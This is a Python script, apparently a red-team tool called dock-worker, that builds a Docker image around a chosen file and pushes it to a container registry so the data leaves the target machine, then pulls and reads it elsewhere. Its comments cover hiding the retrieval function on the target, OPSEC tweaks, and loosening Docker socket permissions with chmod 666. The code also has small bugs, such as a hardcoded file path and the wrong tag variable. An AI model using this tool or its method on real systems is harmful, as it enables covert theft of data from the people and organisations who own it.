#!/usr/bin/env python3

#########################################
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
# 
# You should have recieved a copy of the GNU General Public License along with this program.
# If not, see <https://www.gnu.org/licenses/>.
#########################################

#########################################
# dock-worker.py
# A program written to automate docker container creation with data to be exfiltrated in red team assessments
# Remove the unload function before loading to the target computer
# Ensure docker sdk for python is installed and install/upload as neccessary
# change payploads and dockerfile contents to meet OPSEC needs
#########################################

import docker
import os
import time
import shutil

ascii_art_intro = '''\n

           __                |
          // \\              |
          ||  \\             |  ______                    __           __            __                 __
          ||   \\            |  \____ \     ___     ___  |  | __       \ \    __    / /  ___    ____   |  | __   ____   ____
     _____||_   \\           |   |   | \   / _ \   / __\ |  |/ /  _____ \ \  /  \  / /  / _ \  /  _ \  |  |/ /  / __ \ /  _ \
     |       |  /-\          |   |___|  \ ( (_) ) (  \__ |    <  /____/  \ \/ /\ \/ /  ( (_) ) | | \_\ |    <  (  ___/ | | \_\
_____|_______|  _|__         |  /_______/  \___/   \___/ |__|\_\          \__/  \__/    \___/  |_|     |__|\_\  \____  |_|
_____________| |____|        |
 | |           |____|        |
 | |          +--------+     | Load and Unload containers for data exfiltration
 | |          |        |     |
 | |          |        |     
~|~|~~~~~~~~~~\________/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'''

def load(repository, data2Load, username, password, registry: str="docker.io"):

    try:
        dockWorker = docker.DockerClient(base_url='unix:///var/run/docker.sock/')
    except:
        print("Could not connect to /var/run/docker.sock/ most likely don't have permissions to use, easy not opsec fix is `sudo chmod 666 /var/run/docker.sock`")

    shiftCheckIn = dockWorker.login(username, password, registry=registry)

    tmpDirName = "./" + str(time.time())
    os.mkdir(tmpDirName)

    billOfLadingTitle = tmpDirName + "/Dockerfile"

    billOfLading = open(billOfLadingTitle, "w") # probably should make this its own function since docker workers don't create the containers or the bill of lading
    billOfLading.write("FROM nginx\n") # will be customizeable at some point
    billOfLading.write("COPY {} /tmp/\n".format(data2Load)) # needs to be a file name for now
    billOfLading.close()
    
    shutil.copyfile("./" + data2Load, tmpDirName + "/" + data2Load)

    #print("building the image")
    buildResponse = dockWorker.images.build(path=tmpDirName, tag=repo)
    #print(buildResponse)

    #print("listing the images")
    dockWorker.images.list()

    #print("Pushing the image")
    pushResponse = dockWorker.images.push(repository)

    #print(pushResponse)

    # need to remove the files and directory here depending on the red team's objectives

    return 0

def unload(repository, username, password, registry: str="docker.io"):

    dockWorker = docker.DockerClient(base_url='unix:///var/run/docker.sock/')

    shiftCheckIn = dockWorker.login(username, password, registry=registry)

    dataId = dockWorker.images.pull(repository)
    #print(dataId)

    dataContainer = dockWorker.containers.run(dataId, detach=True)
    
    dataContents = dataContainer.exec_run("cat /tmp/file.txt") # need to somehow flag this 


    print(dataContents)

    return 0


repo = ""
data2Load = ""
username = ""
password = ""

load(repo, data2Load, username, password)

unload(repo, username, password)
